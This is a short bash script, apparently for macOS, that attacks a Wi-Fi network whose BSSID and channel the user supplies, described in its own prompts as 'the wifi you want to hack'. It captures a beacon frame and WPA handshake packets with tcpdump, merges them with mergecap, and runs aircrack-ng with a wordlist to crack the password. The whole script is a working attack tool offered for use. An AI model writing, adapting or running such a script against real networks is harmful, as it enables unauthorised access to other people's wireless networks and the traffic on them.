#!/bin/bash\

BSSID=Default

CHANNEL=Default

resize -s 50 120

clear

airport -s

echo please copy the mac adress of the wifi you want to hack

read BSSID

echo please copy the CHANNEL of the wifi you want to hack

read CHANNEL

airport -z

airport -c$CHANNEL

tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap

echo press ctrl c if you see at least 4

tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap

mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap

rm beacon.cap

rm handshake.cap

resize -s 20 72

aircrack-ng -w HER_SET_YOUR_PATH -b $BSSID capture.cap
